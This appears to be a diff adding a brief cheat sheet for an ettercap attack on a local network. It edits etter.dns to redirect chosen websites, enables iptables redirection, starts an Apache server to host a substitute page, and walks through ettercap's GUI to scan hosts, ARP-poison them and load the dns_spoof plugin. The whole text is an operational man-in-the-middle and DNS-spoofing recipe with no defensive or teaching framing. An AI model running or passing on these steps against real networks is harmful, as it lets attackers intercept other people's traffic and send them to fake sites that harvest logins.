@@ -1,0 +1,20 @@
+nano /etc/ettercap/etter.dns
+#input websites and ips for redirection
+
+nano /etc/ettercap/etter.conf
+#remove (2) '#' for iptables
+
+#start website html in /var/www/html/index.html
+service apache2 start
+
+#run ettercap in graphical interface
+ettercap -G
+#in ettercap:
+# 1. SNIFF -> unified sniffing
+# 2. set to interface (wlan0)
+# 3. HOSTS -> scan for hosts
+# 4. PLUGINS -> manage plugins
+# 5. double click dns_spoof
+# 6. mitm -> arp poisoning...
+# 7. check 'sniff remote connections' (1)
+# 8. SNIFF -> start sniffing
